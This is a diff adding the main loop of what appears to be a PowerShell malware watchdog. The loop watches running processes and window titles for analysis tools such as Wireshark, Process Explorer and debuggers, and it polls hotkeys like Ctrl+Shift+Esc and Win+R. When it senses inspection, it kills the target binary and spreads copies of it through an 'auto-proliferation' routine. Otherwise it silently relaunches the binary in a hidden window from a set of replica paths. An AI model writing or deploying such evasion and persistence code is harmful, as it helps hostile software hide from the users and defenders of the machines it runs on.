@@ -414,3 +414,117 @@ $anomalyKeywords = @(
     'process explorer', 'process hacker', 'wireshark', 'sysinternals', 
     'hardware monitor', 'core temp', 'monitor', 'debugger', 'analyzer'
 )
+$evaluationCounter = 0
+
+# [11. MAIN MONITORING LOOP]
+while ($true) {
+    $evaluationCounter++
+    if ($evaluationCounter -ge 10) {
+        $metrics = $global:NeuralBrain.EvaluateModel()
+        $evaluationCounter = 0
+    }
+
+    $global:NeuralBrain.SyncAndParseInternetIntelligence()
+    Invoke-AutoHealing -nodeRegistryRef ([ref]$global:replicaNodes)
+
+    $targetRunning = Get-Process -Name $binaryBaseName -ErrorAction SilentlyContinue  
+
+    $hotkeyInput = 0.0
+    $processInput = 0.0
+    $keywordInput = 0.0
+    $cloudIndicator = 0.0
+    
+    $probeInput = Get-SystemProbeAnomalyScore
+    $netTrafficInput = Get-NetworkTrafficAnomaly
+    $memoryScanInput = Get-MemoryScanningAnomaly
+
+    try {
+        $ctrlPressed = ([AutoInputDetector]::GetAsyncKeyState(0x11) -band 0x8000) -ne 0
+        $shiftPressed = ([AutoInputDetector]::GetAsyncKeyState(0x10) -band 0x8000) -ne 0
+        $escPressed = ([AutoInputDetector]::GetAsyncKeyState(0x1B) -band 0x8000) -ne 0
+        $winPressed = ([AutoInputDetector]::GetAsyncKeyState(0x5B) -band 0x8000) -ne 0
+        $rPressed = ([AutoInputDetector]::GetAsyncKeyState(0x52) -band 0x8000) -ne 0
+
+        if (($ctrlPressed -and $shiftPressed -and $escPressed) -or $winPressed -or ($winPressed -and $rPressed)) {
+            $hotkeyInput = 1.0
+        }
+    } catch {}
+
+    $activeProcesses = Get-Process -ErrorAction SilentlyContinue  
+    foreach ($proc in $activeProcesses) {  
+        try {
+            $procName = $proc.Name.ToLower()
+            if ($heuristicBlacklist.Contains($procName)) {
+                $processInput = 1.0
+                break
+            }
+
+            if ($global:NeuralBrain.DynamicCloudSignatures.Contains($procName)) {
+                $cloudIndicator = 1.0
+            }
+
+            $windowTitleStr = ""
+            $descriptionStr = ""
+            $companyStr = ""
+
+            try { $windowTitleStr = $proc.MainWindowTitle.ToLower() } catch {}
+            try {
+                if ($proc.MainModule -and $proc.MainModule.FileVersionInfo) {
+                    if ($proc.MainModule.FileVersionInfo.FileDescription) {
+                        $descriptionStr = $proc.MainModule.FileVersionInfo.FileDescription.ToLower()
+                    }
+                    if ($proc.MainModule.FileVersionInfo.CompanyName) {
+                        $companyStr = $proc.MainModule.FileVersionInfo.CompanyName.ToLower()
+                    }
+                }
+            } catch {}
+
+            foreach ($kw in $anomalyKeywords) {
+                if (($windowTitleStr -like "*$kw*") -or ($descriptionStr -like "*$kw*") -or ($companyStr -like "*$kw*")) {
+                    $keywordInput = 1.0
+                    break
+                }
+            }
+
+            if ($processInput -eq 1.0 -or $keywordInput -eq 1.0) { break }
+        } catch {}
+    }  
+
+    $neuralInputs = @($hotkeyInput, $processInput, $keywordInput, $probeInput, $cloudIndicator, $netTrafficInput, $memoryScanInput)
+
+    $threatConfirmations = 0
+    for ($check = 1; $check -le 3; $check++) {
+        $prob = $global:NeuralBrain.Predict($neuralInputs)
+        if ($prob -gt 0.65) {
+            $threatConfirmations++
+        }
+        Start-Sleep -Milliseconds 40
+    }
+
+    if ($threatConfirmations -ge 3) {  
+        if ($targetRunning) {  
+            Stop-Process -Name $binaryBaseName -Force -ErrorAction SilentlyContinue  
+        }
+        if (Test-Path $global:primaryBinaryPath) {
+            Invoke-AutoProliferation -sourceFile $global:primaryBinaryPath -intensity 5
+        }
+    } else {  
+        if (-not $targetRunning) {  
+            $launchCandidate = $global:primaryBinaryPath  
+            if (-not (Test-Path $launchCandidate)) {  
+                foreach ($nodeInstance in $global:replicaNodes) {  
+                    if (Test-Path $nodeInstance) {  
+                        $launchCandidate = $nodeInstance  
+                        break  
+                    }  
+                }  
+            }  
+
+            if ($launchCandidate -and (Test-Path $launchCandidate)) {  
+                Start-Process -FilePath $launchCandidate -ArgumentList $executionArguments -WorkingDirectory (Split-Path $launchCandidate) -WindowStyle Hidden -ErrorAction SilentlyContinue  
+            }  
+        }  
+    }  
+
+    Start-Sleep -Milliseconds (Get-Random -Minimum 400 -Maximum 900)
+}
